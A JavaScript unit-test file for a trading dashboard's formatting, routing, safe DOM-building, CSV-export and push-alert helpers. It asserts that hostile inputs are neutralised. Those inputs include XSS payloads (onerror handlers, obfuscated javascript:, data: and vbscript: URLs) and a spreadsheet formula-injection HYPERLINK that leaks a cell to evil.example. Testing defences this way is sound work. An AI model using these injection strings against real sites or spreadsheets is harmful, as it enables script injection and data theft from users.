// Formatting and routing helpers every page relies on.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { load } from './_load.mjs';

const MD = load(['js/util.js', 'js/router.js']);
const U = MD.util, R = MD.router;

test('money: two decimals everywhere, dust without a sign, compact columns without cents from $1,000', () => {
  assert.equal(U.fmtUsd(1234.5), '$1,234.50');
  assert.equal(U.fmtUsd(-0.0738), '-$0.07');
  assert.equal(U.fmtUsd(0.000716, { sign: true }), '<$0.01');
  assert.equal(U.fmtUsd(-0.004), '<$0.01');
  assert.equal(U.fmtUsd(0), '$0.00');
  assert.equal(U.fmtUsd(12.3, { sign: true }), '+$12.30');
  assert.equal(U.fmtUsd(9159.76, { compact: true }), '$9,160');
  assert.equal(U.fmtUsd(10234, { compact: true }), '$10.2K');
  assert.equal(U.fmtUsd(536.18, { compact: true }), '$536.18');
  assert.equal(U.fmtUsd(0, { compact: true }), '$0');
  assert.equal(U.fmtUsd(2.5e6, { compact: true }), '$2.50M');
  assert.equal(U.fmtUsd(-1532.1, { dp: 0 }), '-$1,532');
});

test('percent, drawdown and durations', () => {
  assert.equal(U.fmtPct(-12.345), '-12.35%');
  assert.equal(U.fmtPct(3, { sign: true, dp: 1 }), '+3.0%');
  assert.equal(U.fmtDd(0.004), '<0.01%');
  assert.equal(U.fmtDd(null), '—');
  assert.equal(U.fmtDuration(90 * 1000), '2m');
  assert.equal(U.fmtDuration(3 * 3600000), '3.0h');
  assert.equal(U.fmtCountdown(26 * 3600000 + 5 * 60000), '1d 2h');
});

test('dates: schedules drop the current year', () => {
  const now = new Date();
  const t = new Date(now.getFullYear(), 8, 22, 23, 0).getTime();
  assert.equal(U.fmtWhen(t), 'Sep 22, 23:00');
  assert.match(U.fmtWhen(new Date(now.getFullYear() - 1, 0, 2, 3, 4).getTime()), /^Jan 2, \d{4} 03:04$/);
});

test('addresses and ids', () => {
  assert.equal(U.isAddress('0x2f46c3fce6bda596c2771bca618c4f69ae3e56b2'), true);
  assert.equal(U.isAddress('0x2f46'), false);
  assert.equal(U.isUuid('01a06b74-185a-765c-8593-c1e044cf79e0'), true);
  assert.equal(U.shortAddr('0x2f46c3fce6bda596c2771bca618c4f69ae3e56b2'), '0x2f46…56b2');
  assert.equal(U.decodeBytes32('0x7072696d61727900000000000000000000000000000000000000000000000000'), 'primary');
});

test('router: paths, params, and a stray "%" in a pasted link does not throw', () => {
  const r = R.parse('#/account?address=0xabc&sub=1&tab=live');
  assert.equal(r.name, 'account'); assert.equal(r.path, '/account'); assert.deepEqual(r.params, { address: '0xabc', sub: '1', tab: 'live' });
  assert.equal(R.parse('#/copytrade/sim/').path, '/copytrade/sim');
  assert.equal(R.parse('#/').name, 'home');
  assert.deepEqual(R.parse('#/tax?note=100%').params, { note: '100%' });
  assert.equal(R.url('/leaderboard', { interval: '7d', empty: '', none: null }), '#/leaderboard?interval=7d');
});

// just enough of a DOM for U.h: it records what gets written, so a refusal shows as a property left empty
class FakeNode {}
class FakeText extends FakeNode { constructor(t) { super(); this.data = t; } }
class FakeEl extends FakeNode {
  constructor(tag) {
    super(); this.tagName = tag; this.attrs = {}; this.kids = []; this.on = {}; this.className = ''; this.id = ''; this.style = {}; this.dataset = {};
    this.href = ''; this.src = ''; this.action = ''; this.title = ''; this.innerHTML = ''; this.outerHTML = ''; this.srcdoc = ''; this.onclick = null;
    this.classList = { add: (c) => { this.className += (this.className ? ' ' : '') + c; } };
  }
  setAttribute(k, v) { this.attrs[k] = String(v); }
  addEventListener(t, f) { (this.on[t] = this.on[t] || []).push(f); }
  appendChild(c) { this.kids.push(c); return c; }
}
const withDom = (fn) => {
  globalThis.Node = FakeNode; globalThis.document = { createElement: (t) => new FakeEl(t), createTextNode: (t) => new FakeText(t) };
  try { fn(); } finally { delete globalThis.Node; delete globalThis.document; }
};

test('h(): an object where text belongs cannot write markup, script handlers or script URLs', () => withDom(() => {
  // what an untyped API field could hand over in h()'s second place
  const a = U.h('div.rules', JSON.parse('{"innerHTML":"<img src=x onerror=alert(1)>","outerHTML":"<b>","srcdoc":"<script>","html":"<img>"}'));
  assert.equal(a.innerHTML, ''); assert.equal(a.outerHTML, ''); assert.equal(a.srcdoc, ''); assert.deepEqual(a.attrs, {}); assert.equal(a.className, 'rules');
  const b = U.h('a', { onclick: 'alert(1)', onmouseover: 'alert(2)', OnFocus: 'alert(3)' });
  assert.equal(b.onclick, null); assert.deepEqual(b.on, {}); assert.deepEqual(b.attrs, {});
  const fn = () => {}; assert.deepEqual(U.h('button', { onclick: fn }).on, { click: [fn] }, 'a function is still a listener');
  for (const bad of ['javascript:alert(1)', ' JaVaScRiPt:alert(1)', 'java\tscript:alert(1)', 'java\nscript:alert(1)', '\u0000javascript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'vbscript:msgbox(1)']) {
    const el = U.h('a', { href: bad, src: bad, action: bad, formaction: bad });
    assert.equal(el.href, '', bad); assert.equal(el.src, '', bad); assert.equal(el.action, '', bad); assert.deepEqual(el.attrs, {}, bad);
  }
  for (const ok of ['#/predict', '/a/0x7c7565ad321ad3df118738fb16ea3bfd416334de', 'agent/copy-agent.mjs', '?x=1', 'https://polymarket.com/event/x', 'http://127.0.0.1:8790/status', 'blob:https://example.test/0b1c']) assert.equal(U.h('a', { href: ok }).href, ok, ok);
  assert.equal(U.h('a', { href: '#/x', title: 't', target: '_blank' }).attrs.target, '_blank', 'other attributes still go through');
}));

test('kid(): a value passed on as h()\'s second argument is text unless it is a node, a list or nothing', () => withDom(() => {
  const obj = { innerHTML: '<img>' }; const node = U.h('span');
  assert.equal(U.kid(obj), '[object Object]'); assert.equal(U.kid(12), '12'); assert.equal(U.kid('BTC-USD'), 'BTC-USD');
  assert.equal(U.kid(node), node); assert.equal(U.kid(null), null); assert.deepEqual(U.kid(['a']), ['a']);
  const el = U.h('div.tick', U.kid(obj)); assert.equal(el.innerHTML, ''); assert.equal(el.kids[0].data, '[object Object]');
}));

test('csvCell(): quoting, and text that a spreadsheet would run as a formula is defused; numbers are left alone', () => {
  assert.equal(U.csvCell('=HYPERLINK("https://evil.example/?"&A2,"details")'), '"\'=HYPERLINK(""https://evil.example/?""&A2,""details"")"');
  assert.equal(U.csvCell('+1 555'), "'+1 555");
  assert.equal(U.csvCell('@SUM(A1)'), "'@SUM(A1)");
  assert.equal(U.csvCell('-2+3'), "'-2+3");
  assert.equal(U.csvCell('\tcmd'), "'\tcmd");
  assert.equal(U.csvCell('\r=1'), '"\'\r=1"');
  for (const n of ['-12.5', '-0.000001', '+3', '0', '1.5e+21', '-.5']) assert.equal(U.csvCell(n), n, n);
  assert.equal(U.csvCell(-3), '-3'); assert.equal(U.csvCell(0), '0');
  assert.equal(U.csvCell('BTC-USD'), 'BTC-USD'); assert.equal(U.csvCell('a, b'), '"a, b"'); assert.equal(U.csvCell(null), ''); assert.equal(U.csvCell(undefined), '');
});

test('ntfy: generated topics are long and random, guessable ones are flagged, servers must be https (http only locally)', () => {
  const AL = load(['js/copy/alerts.js']).alerts;
  const t = AL.newTopic(); assert.match(t, /^md-[a-z2-9]{24}$/); assert.notEqual(t, AL.newTopic()); assert.equal(AL.topicWarning(t), null);
  assert.match(AL.topicWarning('meridian'), /short/);
  assert.match(AL.topicWarning('meridian-alerts-2026'), /words/); assert.match(AL.topicWarning('MeridianAlertsForMe'), /words/);
  assert.equal(AL.topicWarning('x7Kq-9vPz_2mWn4Rb8Ls'), null); assert.equal(AL.topicWarning(''), null);
  const t0 = Date.now(); AL.topicWarning('a'.repeat(5000) + '!'); assert.ok(Date.now() - t0 < 200, 'no catastrophic backtracking');
  for (const s of ['https://ntfy.sh', 'https://push.example.org/', 'http://localhost:8080', 'http://127.0.0.1']) assert.equal(AL.serverOk(s), true, s);
  for (const s of ['http://ntfy.sh', 'http://192.168.1.5', 'ntfy.sh', 'javascript:alert(1)', '']) assert.equal(AL.serverOk(s), false, s);
});
